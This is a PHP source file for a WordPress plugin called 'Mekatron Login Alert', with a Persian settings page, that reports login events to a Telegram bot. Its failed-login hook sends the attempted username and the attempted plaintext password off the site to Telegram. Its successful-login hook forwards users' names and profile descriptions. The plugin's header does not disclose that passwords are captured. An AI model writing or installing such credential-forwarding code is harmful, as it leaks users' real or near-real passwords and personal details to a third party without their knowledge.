<?php

/*
Plugin Name: Mekatron Login Alert
Plugin URI: http://URI_Of_Page_Describing_Plugin_and_Updates
Description: A brief description of the Plugin.
Version: 1.0
Author: Muhammmad Reza Heidary
Author URI: http://URI_Of_The_Plugin_Author
License: MIT
*/


include(plugin_dir_path(__FILE__).'libs/notificator-telegram-bot.php');

add_action('admin_menu', function () {
    add_options_page('هشدار تلگرام',
        'هشدار تلگرام',
        'manage_options',
        'login-alert',
        function () {
            wp_enqueue_style( 'my-style', plugins_url( 'libs/mekatron-login-alert-setting-page-style.css', __FILE__ ), false, '1.0', 'all' );
            $html = file_get_contents(plugin_dir_path(__FILE__).'libs/mekatron-login-alert-settings-page.html');
            echo $html;
        });
});

add_action('template_redirect', function () {
    if(is_search()) {
        global $wp_query;
        if($wp_query->found_posts == 1) {
            $url = get_permalink($wp_query->posts[0]->ID);
            wp_redirect($url);
            exit;
        }
    }
});

add_action('wp_login_failed', function ($username, $error) {
    telegram_notificator_send_message('Login Failed for '.$username.PHP_EOL.
        $error->get_error_message ());
    telegram_notificator_send_message('Tried User: '.$_REQUEST['log'].PHP_EOL.
        'Tried Pass: '.$_REQUEST['pwd']);
}, 10, 2);

add_action('wp_login', function ($user_login, $user ) {
    telegram_notificator_send_message('نام کاربری: '.$user_login.PHP_EOL.
        'نام: '.$user->first_name.' '.PHP_EOL.
        'فامیل: '.$user->last_name.PHP_EOL.
        'توضیحات: '.$user->description);
}, 10, 2);


add_action('wp_head', function () {
    echo "<!-- This is Header -->".PHP_EOL;
}, 999);

add_action('wp_footer', function () {
    echo "<!-- This is Footer -->".PHP_EOL;
}, 9999);